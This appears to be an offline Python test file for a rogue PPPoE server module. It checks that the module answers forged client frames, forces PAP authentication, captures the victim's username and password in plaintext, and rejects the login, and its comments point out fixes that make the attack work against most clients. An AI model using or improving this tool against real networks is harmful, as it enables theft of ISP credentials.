# -*- coding: utf-8 -*-
"""
离线功能验证：把伪造的 PPPoE 拨号报文喂给移植版，
拦截 sendp 捕获回包，逐字节核对协议行为。全程不碰真实网卡。
"""
import os
import sys
# v1 归档：本文件是历史留档，指向仓库根目录（只作对照，不参与回归）
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pppoe_hijack_py3 as H
from scapy.all import Ether, Raw

sent = []
H.sendp = lambda pkt, **kw: sent.append(pkt)      # 拦截发包

SRV = "0a0a0a0a0a0a"      # 攻击者/伪装 MAC
CLI = "112233445566"      # 受害客户端 MAC
SRV_FMT = "0a:0a:0a:0a:0a:0a"
CLI_FMT = "11:22:33:44:55:66"

def frame(eth_type, body_hex):
    """源 = 客户端 MAC，目的 = 伪装 MAC（PADI 实际是广播，不影响逻辑）"""
    return Ether(bytes.fromhex(SRV + CLI + eth_type + body_hex))

def tail(pkt):
    """(eth_type, pppoe_code, sessionid, ppp_proto, payload_hex)
       以太头 14B + PPPoE 头 6B"""
    e = bytes(pkt)
    et = int.from_bytes(e[12:14], "big")
    code = e[15]
    sid = int.from_bytes(e[16:18], "big")
    plen = int.from_bytes(e[18:20], "big")
    body = e[20:20 + plen]
    if et == 0x8864 and len(body) >= 2:
        return et, code, sid, int.from_bytes(body[:2], "big"), body[2:].hex()
    return et, code, sid, None, body.hex()

def lcp_code(pl):
    return int(pl[:2], 16)

srv = H.PPPoEServer(iface=None, mac=SRV, verbose=False)
ok = 0

def check(label, cond, detail=""):
    global ok
    print(("  [PASS] " if cond else "  [FAIL] ") + label + (("  " + detail) if detail else ""))
    assert cond, label
    ok += 1

print("=" * 76)
print("A. PADI -> PADO")
print("=" * 76)
# Ether / PPPoE(discovery, code=0x09, len=0x000c) / Service-Name + Host-Uniq
srv.filterData(frame("8863", "1109" + "0000" + "000c" + "01010000" + "01030004aabbccdd"))
p = sent[-1]
et, code, sid, _, pal = tail(p)
print("  dst=%s src=%s eth_type=%#06x code=%#04x sessionid=%#06x" % (p.dst, p.src, et, code, sid))
print("  payload =", pal)
check("PADO 目标为客户端 MAC", p.dst == CLI_FMT)
check("PADO 源为伪装 MAC", p.src == SRV_FMT)
check("eth_type=0x8863 / code=PADO(0x07)", et == 0x8863 and code == 0x07)
check("tag = Service-Name+AC-Name('^_^')+回显 Host-Uniq",
      pal == "01010000010200035e5f5e01030004aabbccdd",
      "(原版此处若不回显 Host-Uniq，多数 BRAS 客户端会丢弃 PADO)")

print()
print("=" * 76)
print("B. PADR -> PADS")
print("=" * 76)
sent.clear()
srv.filterData(frame("8863", "1119" + "0000" + "000c" + "01010000" + "01030004aabbccdd"))
et, code, sid, _, pal = tail(sent[-1])
print("  eth_type=%#06x code=%#04x sessionid=%#06x payload=%s" % (et, code, sid, pal))
check("code=PADS(0x65)", code == 0x65)
check("分配 sessionid=0x01（原版硬编码）", sid == 0x01)

print()
print("=" * 76)
print("C. LCP Config-Req（首次）-> Reject + 我方 Req(钉 PAP) + Ack")
print("=" * 76)
sent.clear()
# Ether/PPPoE(code=0,sid=1)/PPP(0xc021)/LCP: code=01 id=01 len=000e + MRU1500 + MagicNumber
lcp_req = "1100" + "0001" + "0010" + "c021" + "0101" + "000e" + "010405dc" + "05065e630ab8"
srv.filterData(frame("8864", lcp_req))
for i, pk in enumerate(sent, 1):
    et, c, s, pr, pl = tail(pk)
    print("  #%d eth=%#06x sid=%#04x proto=%#06x lcp_code=%d  %s" % (i, et, s, pr, lcp_code(pl), pl))
check("共发 3 个包 (Reject/Req/Ack)", len(sent) == 3)
check("第1包 = LCP Configure-Reject(4)", tail(sent[0])[3] == 0xc021 and lcp_code(tail(sent[0])[4]) == 4)
check("第2包 = LCP Configure-Request(1)", lcp_code(tail(sent[1])[4]) == 1)
check("Req 内含 Auth-Protocol = PAP(0xc023)", "0304c023" in tail(sent[1])[4])
check("第3包 = LCP Configure-Ack(2)", lcp_code(tail(sent[2])[4]) == 2)
check("Ack 原样回显客户端选项", tail(sent[2])[4][2:] == tail(sent[0])[4][2:])

print()
print("=" * 76)
print("D. LCP Config-Req（第二次）-> 只回 Ack，不重复下发 Req")
print("=" * 76)
sent.clear()
srv.filterData(frame("8864", lcp_req))
print("  发包数 =", len(sent), "| clientMap =", dict(srv.clientMap))
check("只发 1 个 Ack", len(sent) == 1 and lcp_code(tail(sent[0])[4]) == 2)

print()
print("=" * 76)
print("E. PAP Authenticate-Request -> 明文提取账号密码 + 回 Nak")
print("=" * 76)
sent.clear()
user, passwd = b"user01", b"pass123"
pap_body = (b"\x01\x08\x00" + bytes([6 + len(user) + len(passwd)])
            + bytes([len(user)]) + user + bytes([len(passwd)]) + passwd)
raw_hex = (SRV + CLI + "8864" + "1100" + "0001"
           + format(len(pap_body) + 2, "04x") + "c023" + pap_body.hex())
srv.filterData(Ether(bytes.fromhex(raw_hex)))
print("  捕获 =", srv.creds)
et, c, s, pr, pl = tail(sent[-1])
print("  回包 eth=%#06x sid=%#04x proto=%#06x pap_code=%d payload=%s" % (et, s, pr, int(pl[:2], 16), pl))
check("截获 user01/pass123", srv.creds[-1]["user"] == "user01" and srv.creds[-1]["pass"] == "pass123")
check("回包 = PAP Authenticate-Nak(3)", pr == 0xc023 and int(pl[:2], 16) == 3)
check("clientMap 记录已清除", srv.clientMap == {})

print()
print("=" * 76)
print("F. 自环防护：伪装 MAC 自己发出的 LCP-Req 必须被丢弃")
print("=" * 76)
sent.clear()
srv.filterData(Ether(bytes.fromhex(CLI + SRV + "8864" + "1100" + "0001" + "0010"
                                   + "c021" + "0101" + "000e" + "010405dc" + "05065e630ab8")))
print("  发包数 =", len(sent), "(原版会把自发的 Req 当新客户端，触发无休止发包)")
check("无自环发包", sent == [])

print()
print("=" * 76)
print("G. 无关报文（ARP）不引起动作")
print("=" * 76)
sent.clear()
srv.filterData(Ether(dst="ff:ff:ff:ff:ff:ff", src=CLI, type=0x0806) / Raw(load=b"\x00" * 28))
check("发包数 = 0", sent == [])

print()
print("=" * 76)
print("全部 %d 项离线用例通过。以上的包都能在真实 Npcap 网卡上原样发出。" % ok)
print("=" * 76)
